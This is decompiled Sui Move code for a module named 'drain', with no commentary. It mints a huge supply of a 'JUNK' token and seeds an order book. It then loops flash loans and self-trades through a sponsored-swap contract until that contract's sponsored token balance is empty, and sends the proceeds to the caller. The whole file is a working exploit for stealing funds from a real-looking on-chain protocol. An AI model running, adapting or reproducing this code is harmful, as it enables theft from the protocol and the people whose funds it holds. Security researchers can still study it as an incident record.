module 0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::drain {
    public entry fun drain<T0, T1>(arg0: &mut 0xa77ab364e584d5099b5494cb20805f87763dd35f6900d40ed26b577f7a97a33a::sponsored_swap::SponsoredTokens, arg1: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::Pool<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK, T0>, arg2: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::Pool<T1, T0>, arg3: &mut 0x2::coin::TreasuryCap<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK>, arg4: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::BalanceManager, arg5: &0x2::clock::Clock, arg6: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg4, arg6);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::deposit<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK>(arg4, 0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::mint(arg3, 20000000000000, arg6), arg6);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::place_limit_order<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK, T0>(arg1, arg4, &v0, 1, 3, 0, 1000000000, 20000000000000, false, true, 0, arg5, arg6);
        let v1 = 0;
        while (0xa77ab364e584d5099b5494cb20805f87763dd35f6900d40ed26b577f7a97a33a::sponsored_swap::sponsored_token_balance(arg0) > 0 && v1 < 60) {
            let v2 = v1 + 1;
            v1 = v2;
            let v3 = 0xa77ab364e584d5099b5494cb20805f87763dd35f6900d40ed26b577f7a97a33a::sponsored_swap::sponsored_token_balance(arg0);
            let v4 = 700000000000;
            let v5 = v4;
            let (_, _, v8) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::get_base_quantity_out<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK, T0>(arg1, v4, arg5);
            if (v8 == 0) {
                break
            };
            if (v8 > v3) {
                let v9 = (((v4 as u128) * (v3 as u128) / (v8 as u128)) as u64) * 99 / 100;
                v5 = v9;
                if (v9 < 100000) {
                    break
                };
            };
            let (v10, v11) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::borrow_flashloan_quote<T1, T0>(arg2, v5, arg6);
            let (v12, v13) = 0xa77ab364e584d5099b5494cb20805f87763dd35f6900d40ed26b577f7a97a33a::sponsored_swap::swap_exact_quote_for_base_sponsored<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK, T0>(arg0, arg1, v10, 0, arg5, arg6);
            let v14 = v12;
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK, T0>(arg1, arg4, &v0);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::place_limit_order<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK, T0>(arg1, arg4, &v0, 1000 + v2, 3, 0, 999999999, 0x2::coin::value<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK>(&v14), true, true, 0, arg5, arg6);
            let (v15, v16) = 0xa77ab364e584d5099b5494cb20805f87763dd35f6900d40ed26b577f7a97a33a::sponsored_swap::swap_exact_base_for_quote_sponsored<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK, T0>(arg0, arg1, v14, 0, arg5, arg6);
            let v17 = v15;
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK, T0>(arg1, arg4, &v0);
            let v18 = v16;
            0x2::coin::join<T0>(&mut v18, v13);
            let v19 = v5 - 0x2::coin::value<T0>(&v18);
            if (v19 > 0) {
                0x2::coin::join<T0>(&mut v18, 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::withdraw<T0>(arg4, v19, arg6));
            };
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::return_flashloan_quote<T1, T0>(arg2, v18, v11);
            if (0x2::coin::value<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK>(&v17) > 0) {
                0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::deposit<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK>(arg4, v17, arg6);
                continue
            };
            0x2::coin::destroy_zero<0xa001607e44188b543fbc303d17519fa1f52cc8d08d1ab5a2adf508f145c70265::junk::JUNK>(v17);
        };
        let v20 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::withdraw_all<T0>(arg4, arg6);
        if (0x2::coin::value<T0>(&v20) > 0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(v20, 0x2::tx_context::sender(arg6));
        } else {
            0x2::coin::destroy_zero<T0>(v20);
        };
    }

    // decompiled from Move bytecode v7
}

